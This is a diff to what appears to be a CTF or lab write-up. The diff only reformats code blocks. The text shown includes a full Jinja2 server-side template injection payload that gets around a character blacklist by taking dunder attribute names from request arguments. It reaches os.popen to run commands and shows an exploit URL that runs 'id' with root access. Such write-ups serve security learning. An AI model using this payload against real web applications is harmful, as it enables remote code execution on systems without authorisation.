@@ -221,8 +221,9 @@ The idea was to use another input parameter to read the payload, this approach i
 
 And that’s the payload I came with
 
-`{%with output=((((request|attr('application'))|attr(request|attr("args")|attr("get")('globals')))|attr(request|attr("args")|attr("get")('getitem')))(request|attr("args")|attr("get")('builtins'))|attr(request|attr("args")|attr("get")('getitem')))(request|attr("args")|attr("get")('import'))('os')|attr('popen')(request|attr("args")|attr("get")('cmd'))|attr('read')()%}{%print(output)%}{%endwith%}&globals=__globals__&getitem=__getitem__&builtins=__builtins__&import=__import__&cmd=`
-
+```jinja2
+{%with output=((((request|attr('application'))|attr(request|attr("args")|attr("get")('globals')))|attr(request|attr("args")|attr("get")('getitem')))(request|attr("args")|attr("get")('builtins'))|attr(request|attr("args")|attr("get")('getitem')))(request|attr("args")|attr("get")('import'))('os')|attr('popen')(request|attr("args")|attr("get")('cmd'))|attr('read')()%}{%print(output)%}{%endwith%}&globals=__globals__&getitem=__getitem__&builtins=__builtins__&import=__import__&cmd=`
+```
 
 To bypass the filter, I crafted a payload that cleverly navigates around the blacklisted characters
 
@@ -243,7 +244,7 @@ I navigated through the  `request`  attributes to access Python’s  `globals`  
 
 And Successfully executed the  `id`  command, confirming root access
 
-```
+```jinja2
 http://0.0.0.0:3000/home?token=<>&directory={%with output=((((request|attr('application'))|attr(request|attr("args")|attr("get")('globals')))|attr(request|attr("args")|attr("get")('getitem')))(request|attr("args")|attr("get")('builtins'))|attr(request|attr("args")|attr("get")('getitem')))(request|attr("args")|attr("get")('import'))('os')|attr('popen')(request|attr("args")|attr("get")('cmd'))|attr('read')()%}{%print(output)%}{%endwith%}&globals=__globals__&getitem=__getitem__&builtins=__builtins__&import=__import__&cmd=id
 ```
 
